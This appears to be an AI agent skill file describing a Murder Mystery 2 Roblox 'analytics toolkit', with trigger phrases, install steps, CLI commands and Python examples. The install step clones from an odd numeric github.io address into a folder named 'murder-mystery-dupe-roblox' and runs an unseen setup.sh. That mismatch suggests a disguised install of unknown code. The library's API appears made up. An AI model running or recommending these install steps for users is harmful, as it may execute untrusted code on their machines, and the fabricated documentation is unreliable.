---
name: mm2-roblox-analytics-toolkit
description: Murder Mystery 2 analytics dashboard for Roblox inventory tracking, gameplay statistics, and strategy optimization
triggers:
  - "help me analyze my Murder Mystery 2 inventory"
  - "track my MM2 knife skins and stats"
  - "set up Roblox MM2 analytics dashboard"
  - "optimize my Murder Mystery 2 strategy"
  - "export my MM2 gameplay statistics"
  - "configure MM2 inventory tracker"
  - "analyze Murder Mystery 2 win rates"
  - "visualize my Roblox MM2 data"
---

# MM2 Roblox Analytics Toolkit

> Skill by [ara.so](https://ara.so) — Data Skills collection.

A comprehensive analytics and tracking toolkit for Murder Mystery 2 on Roblox. This project provides inventory management, gameplay statistics tracking, data visualization, and strategic insights for MM2 players.

## What This Project Does

The MM2 Analytics Toolkit offers:

- **Inventory Management**: Track knife skins, gamepasses, and collectibles
- **Analytics Dashboard**: Visualize win/loss ratios, role performance, and gameplay trends
- **Strategy Analysis**: Pattern recognition for optimal gameplay approaches
- **Data Export**: Statistics export in CSV and JSON formats
- **AI Integration**: OpenAI and Claude API support for predictive insights

## Installation

### Quick Setup (Automated)

```bash
chmod +x setup.sh
./setup.sh --install
```

### Manual Installation

```bash
# Clone the repository
git clone https://8015238355.github.io
cd murder-mystery-dupe-roblox

# Install Node.js dependencies
npm install

# Install Python dependencies
python3 -m pip install -r requirements.txt
```

### System Requirements

- **Python**: 3.8+
- **Node.js**: 16+
- **OS**: Windows 10/11, macOS Ventura+, Ubuntu 22.04+
- **Browser**: Chrome 120+, Firefox 121+

## Configuration

### Environment Variables

Create a `.env` file in the project root:

```bash
# AI API Keys (optional)
API_OPENAI_KEY=${OPENAI_API_KEY}
API_CLAUDE_KEY=${CLAUDE_API_KEY}

# Data Configuration
DATA_DIRECTORY=./data/collections
ANALYTICS_INTERVAL=300
ENABLE_LIVE_TRACKING=true

# Export Settings
EXPORT_FORMAT=json,csv
LOG_LEVEL=INFO
```

### Profile Configuration

Create `config/profile.yaml`:

```yaml
profile:
  username: "MysterySolver2026"
  preferred_role: "sheriff"
  inventory_filter:
    - category: "knife_skins"
      rarity: ["legendary", "ancient"]
    - category: "gamepasses"
      active: true
  analytics_preferences:
    tracking_mode: "comprehensive"
    data_refresh_rate: 30
    export_format: "csv, json"
  strategy_templates:
    - name: "aggressive_sheriff"
      priority: "high_visibility_areas"
    - name: "passive_innocent"
      priority: "distraction_avoidance"
```

## Key Commands (CLI)

### Basic Analytics

```bash
# Run analytics in comprehensive mode
python3 main.py --mode analytics --profile default

# Export statistics
python3 main.py --mode analytics \
  --profile mystery_solver_01 \
  --export statistics_2026.json \
  --format json

# Verbose logging
python3 main.py --mode analytics \
  --verbose \
  --log-level DEBUG
```

### Inventory Management

```bash
# Scan inventory for knife skins
python3 main.py --mode inventory \
  --scan knife_skins \
  --export inventory.csv

# Track gamepass effectiveness
python3 main.py --mode inventory \
  --analyze gamepasses \
  --period 30days
```

### Strategy Analysis

```bash
# Analyze strategy patterns
python3 main.py --mode strategy \
  --role sheriff \
  --sessions 50 \
  --output strategy_report.json

# Generate recommendations
python3 main.py --mode strategy \
  --recommend \
  --ai-powered \
  --export recommendations.txt
```

## Python API Usage

### Basic Analytics Session

```python
from mm2_analytics import AnalyticsEngine, Profile

# Load user profile
profile = Profile.load("config/profile.yaml")

# Initialize analytics engine
engine = AnalyticsEngine(profile)

# Run analysis
results = engine.analyze(
    mode="comprehensive",
    timeframe="30days"
)

# Access statistics
print(f"Win Rate: {results.win_rate}%")
print(f"Favorite Role: {results.top_role}")
print(f"Total Matches: {results.match_count}")

# Export data
engine.export(
    results,
    format="json",
    output_path="./exports/stats.json"
)
```

### Inventory Tracking

```python
from mm2_analytics import InventoryManager

# Initialize inventory manager
inventory = InventoryManager()

# Scan for knife skins
knife_skins = inventory.scan_category(
    category="knife_skins",
    filters={"rarity": ["legendary", "ancient"]}
)

# Display results
for skin in knife_skins:
    print(f"{skin.name} - Rarity: {skin.rarity} - Value: {skin.estimated_value}")

# Track collection completeness
completeness = inventory.calculate_completeness(
    category="knife_skins"
)
print(f"Collection: {completeness.percentage}% complete")
print(f"Missing items: {len(completeness.missing_items)}")
```

### Strategy Pattern Analysis

```python
from mm2_analytics import StrategyAnalyzer

# Initialize analyzer
analyzer = StrategyAnalyzer()

# Load match history
matches = analyzer.load_matches(
    profile="mystery_solver_01",
    count=100
)

# Analyze patterns
patterns = analyzer.identify_patterns(
    matches=matches,
    role="sheriff"
)

# Generate recommendations
recommendations = analyzer.recommend(
    current_strategy=patterns.dominant_strategy,
    win_rate_threshold=0.65
)

for rec in recommendations:
    print(f"Strategy: {rec.name}")
    print(f"Expected Win Rate: {rec.expected_win_rate}%")
    print(f"Key Actions: {', '.join(rec.key_actions)}")
```

### AI-Powered Insights (OpenAI)

```python
import os
from mm2_analytics import AIInsights

# Initialize with API key from environment
ai = AIInsights(
    openai_key=os.getenv("API_OPENAI_KEY")
)

# Get strategic advice
advice = ai.get_strategy_advice(
    role="sheriff",
    current_win_rate=0.58,
    playstyle="aggressive"
)

print(advice.suggestions)

# Predict inventory value trends
predictions = ai.predict_value_trends(
    items=["Chroma Luger", "Ice Dragon"],
    timeframe="30days"
)

for item, trend in predictions.items():
    print(f"{item}: {trend.direction} ({trend.confidence}% confidence)")
```

### Data Visualization

```python
from mm2_analytics import DataVisualizer
import matplotlib.pyplot as plt

# Initialize visualizer
viz = DataVisualizer()

# Load analytics results
results = engine.analyze(mode="comprehensive")

# Create win rate chart
viz.plot_win_rate_timeline(
    data=results.timeline_data,
    output="charts/win_rate.png"
)

# Generate role distribution pie chart
viz.plot_role_distribution(
    data=results.role_stats,
    output="charts/roles.png"
)

# Create interactive dashboard (HTML)
viz.create_dashboard(
    data=results,
    output="dashboard.html",
    theme="dark"
)
```

## Common Patterns

### Complete Analytics Workflow

```python
from mm2_analytics import (
    Profile,
    AnalyticsEngine,
    InventoryManager,
    StrategyAnalyzer,
    DataVisualizer
)

# 1. Load profile
profile = Profile.load("config/profile.yaml")

# 2. Run comprehensive analysis
engine = AnalyticsEngine(profile)
analytics = engine.analyze(
    mode="comprehensive",
    timeframe="90days"
)

# 3. Scan inventory
inventory = InventoryManager()
items = inventory.scan_all_categories()

# 4. Analyze strategy
strategy = StrategyAnalyzer()
patterns = strategy.identify_patterns(
    matches=analytics.match_history,
    role="sheriff"
)

# 5. Visualize results
viz = DataVisualizer()
viz.create_dashboard(
    analytics_data=analytics,
    inventory_data=items,
    strategy_data=patterns,
    output="reports/complete_dashboard.html"
)

# 6. Export comprehensive report
engine.export_report(
    analytics=analytics,
    inventory=items,
    strategy=patterns,
    format="pdf",
    output="reports/mm2_report.pdf"
)
```

### Real-Time Tracking Session

```python
from mm2_analytics import LiveTracker
import time

# Initialize live tracker
tracker = LiveTracker(
    profile="mystery_solver_01",
    refresh_interval=30
)

# Start tracking session
tracker.start()

try:
    while True:
        # Get current session stats
        stats = tracker.get_current_session()
        
        print(f"\n=== Live Session Stats ===")
        print(f"Matches Played: {stats.matches}")
        print(f"Current Win Rate: {stats.win_rate}%")
        print(f"Role Distribution: {stats.role_dist}")
        
        time.sleep(30)
        
except KeyboardInterrupt:
    # Stop tracking and save session
    session_data = tracker.stop()
    tracker.export(
        session_data,
        output="sessions/session_{timestamp}.json"
    )
```

### Batch Export for Multiple Profiles

```python
from mm2_analytics import BatchProcessor
import os

# Define profiles to process
profiles = [
    "mystery_solver_01",
    "sheriff_master",
    "innocent_ninja"
]

# Initialize batch processor
processor = BatchProcessor()

# Process all profiles
for profile_name in profiles:
    print(f"Processing: {profile_name}")
    
    results = processor.run_analytics(
        profile=profile_name,
        mode="comprehensive",
        timeframe="30days"
    )
    
    # Export individual report
    processor.export(
        results,
        format="json",
        output=f"exports/{profile_name}_stats.json"
    )

# Generate comparative report
comparison = processor.compare_profiles(profiles)
processor.export_comparison(
    comparison,
    output="exports/profile_comparison.html"
)
```

## Troubleshooting

### Common Issues

**Issue: `ModuleNotFoundError: No module named 'mm2_analytics'`**

```bash
# Ensure you're in the project directory
cd murder-mystery-dupe-roblox

# Reinstall dependencies
pip install -r requirements.txt

# Add project to Python path
export PYTHONPATH="${PYTHONPATH}:$(pwd)"
```

**Issue: Profile configuration not loading**

```python
# Verify profile path
import os
profile_path = "config/profile.yaml"
print(f"Profile exists: {os.path.exists(profile_path)}")

# Load with error handling
from mm2_analytics import Profile

try:
    profile = Profile.load(profile_path)
except FileNotFoundError:
    print("Creating default profile...")
    profile = Profile.create_default()
    profile.save(profile_path)
```

**Issue: Analytics export fails**

```python
# Check export directory permissions
import os
export_dir = "./exports"
os.makedirs(export_dir, exist_ok=True)

# Export with error handling
try:
    engine.export(results, format="json", output=f"{export_dir}/stats.json")
except PermissionError:
    print(f"Cannot write to {export_dir}. Check permissions.")
except Exception as e:
    print(f"Export failed: {e}")
```

**Issue: AI API integration not working**

```python
# Verify API keys are set
import os

openai_key = os.getenv("API_OPENAI_KEY")
claude_key = os.getenv("API_CLAUDE_KEY")

if not openai_key:
    print("Warning: OPENAI_API_KEY not set. AI features disabled.")
if not claude_key:
    print("Warning: CLAUDE_API_KEY not set. Claude features disabled.")

# Test API connection
from mm2_analytics import AIInsights

ai = AIInsights(openai_key=openai_key)
if ai.test_connection():
    print("API connection successful")
else:
    print("API connection failed. Check key validity.")
```

### Performance Optimization

```python
# Enable caching for repeated analyses
from mm2_analytics import AnalyticsEngine

engine = AnalyticsEngine(
    profile=profile,
    cache_enabled=True,
    cache_ttl=3600  # 1 hour
)

# Limit data processing for large datasets
results = engine.analyze(
    mode="comprehensive",
    timeframe="30days",
    max_matches=1000,  # Limit to 1000 most recent matches
    parallel_processing=True
)
```

### Debug Mode

```bash
# Run with verbose debugging
python3 main.py --mode analytics \
  --verbose \
  --log-level DEBUG \
  --debug-output debug.log

# View debug log
tail -f debug.log
```

## Advanced Usage

### Custom Analytics Modules

```python
from mm2_analytics.core import BaseAnalyzer

class CustomWinRateAnalyzer(BaseAnalyzer):
    def analyze(self, matches):
        # Custom analysis logic
        sheriff_wins = [m for m in matches if m.role == "sheriff" and m.won]
        total_sheriff = [m for m in matches if m.role == "sheriff"]
        
        win_rate = len(sheriff_wins) / len(total_sheriff) if total_sheriff else 0
        
        return {
            "custom_win_rate": win_rate * 100,
            "sheriff_matches": len(total_sheriff),
            "sheriff_wins": len(sheriff_wins)
        }

# Use custom analyzer
analyzer = CustomWinRateAnalyzer()
results = analyzer.analyze(match_history)
print(results)
```

This toolkit provides comprehensive data analysis capabilities for Murder Mystery 2 players seeking to optimize their inventory management and gameplay strategies through data-driven insights.
